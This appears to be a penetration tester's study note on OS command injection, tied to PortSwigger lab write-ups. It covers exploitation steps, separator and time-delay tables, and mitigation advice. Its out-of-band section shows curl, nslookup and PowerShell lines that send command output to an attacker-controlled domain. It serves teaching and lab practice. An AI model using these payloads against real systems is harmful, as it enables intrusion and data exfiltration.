# [Operating System Command Injection](https://portswigger.net/web-security/os-command-injection)

> A web application vulnerability in which the application passes unsanitized user input into some part of an operating system (shell) command. The attacker breaks out of the original shell command and executes their own arbitrary commands to achieve their objectives.

---

## OS Command Injection with Output in Response

### Process

#### 1. Profile the web application and identify any inputs that might be passed to a shell command

#### 2. Play around with various [[os-command-injection#Command Separators|command separators]] to ensure you can break out of the original command

#### 3. Execute commands (potentially from the [[os-command-injection#Useful Commands|useful commands list]])

Example: [PortSwigger Web Security Academy OS Command Injection Lab - OS command injection, simple case](https://github.com/tgihf/writeups/blob/master/port-swigger-web-academy/os-command-injection/01%20-%20OS%20command%20injection%2C%20simple%20case.md).

---

## Blind OS Command Injection

### Process

#### 1. Profile the web application and identify any inputs that might be passed to a shell command

#### 2. Play around with various [[os-command-injection#Command Separators|command separators]] and [[os-command-injection#Time Delay Commands|time delay commands]] to ensure you can break out of the original command and execute your own

#### 3. Execute commands (potentially from the [[os-command-injection#Useful Commands|useful commands list]]) and retrieve output

##### Different methods of retrieving output:

###### 1. Redirect output to a location that is readable

Are there any files or directories on the target machine that are readable? Maybe via an SMB share? Or a web root (i.e., `/var/www/`)?

Use the `>` operator in `bash`, `cmd`, and `PowerShell` to direct the output of the comand to the readable file or directory.

Example: [PortSwigger Web Security Academy OS Command Injection Lab - Blind OS command injection with output redirection](https://github.com/tgihf/writeups/blob/master/port-swigger-web-academy/os-command-injection/03%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection.md).

###### 2. Out-of-band exfiltration

Execute a command and have the target post the output via DNS or HTTP to a domain or server that you own.

Always be aware of the fact that DNS names have to start with a letter.

Linux:

```bash
nslookup `whoami`.tgihf.click
```

```bash
curl "https://blah.tgihf.click?output=$(whoami)"
```

Windows `PowerShell`:

```powershell
Resolve-DnsName -Name "$($Env:Username).tgihf.click"
```

```powershell
$output = whoami; curl https://blah.tgihf.click?output=$output
```

---

## Command Separators

### Linux `bash`

| operator | usage | function |
| --- | --- | --- |
| `#` | `whoami # blah` | Comment |
| `;` | `whoami; id` | Execute both commands in sequence |
| `&&` | `whoami && id` | AND. Execute the second command if the first command completes successfully |
| \|\| | whoami \|\| id | OR. Execute the second command only if the first command fails |
| `&` | `whoami & id` | Execute the first command in the background, then executed the second command |
| \` \` | ls \`id\` | Inline execution. Command inside the backticks is executed before the outer command |
| `$()` | `ls $(id)` | Inline execution. Command inside the parenthesis is executed before the outer command |

### Windows `cmd`

| operator | usage | function |
| --- | --- | --- |
| `&` | `whoami & net user` | Execute both commands in sequence |
| `&&` | `whoami && net user` | Logical AND. Execute the second comand if the first command completes successfully |
| \|\| | whoami \|\| id | OR. Execute the second command only if the first command fails |

### Windows `PowerShell`

| operator | usage | function |
| --- | --- | --- |
| `;` | `whoami; net user` | Execute both comands in sequence |

---

## Useful Commands

| Description | Linux | Windows |
| --- | --- | --- |
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

---

## Time Delay Commands

### Linux Time Delay Commands

- `sleep $N`
	- Sleep for `$N` seconds
- `ping -c $N 127.0.0.1`
	- Ping localhost `$N` times, once per second

Example: [PortSwigger Web Security Academy OS Command Injection Lab - Blind OS command injection with time delays](https://github.com/tgihf/writeups/blob/master/port-swigger-web-academy/os-command-injection/02%20-%20Blind%20OS%20command%20injection%20with%20time%20delays.md).

### Windows `cmd` Time Delay Commands

- `timeout /t $N /nobreak >nul`
	- Sleep for `$N` seconds
- `ping 127.0.0.1 -n $N > nul`
	- Ping localhost `$N` times, once per second


### Windows `PowerShell` Time Delay Comands

- `Start-Sleep -Seconds $N | Out-Null`
	- Sleep for `$N` seconds
- `Test-Connection 127.0.0.1 -Count $N | Out-Null`
	- Ping localhost `$N` times, once per second

---

## OS Command Injection Mitigation

### 1. Don't pass user input to OS commands

There is generally a way to implement the same functionality using safer, platform-dependent APIs.

### 2. If you can't do #1, validate user input

It is best to validate user input against a whitelist of permitted values.

If you can't do that, validate user input against a solid regular expression.

If you can't do either of those, at least verify that user input contains only permitted characters, like alphanumeric characters. No other syntax, like whitespace or any of the [[os-command-injection#Command Separators|command separators]], should be allowed.

Don't attempt to simply escape shell metacharacters. This approach is too error-prone and vulnerable to being bypassed by a skilled attacker.
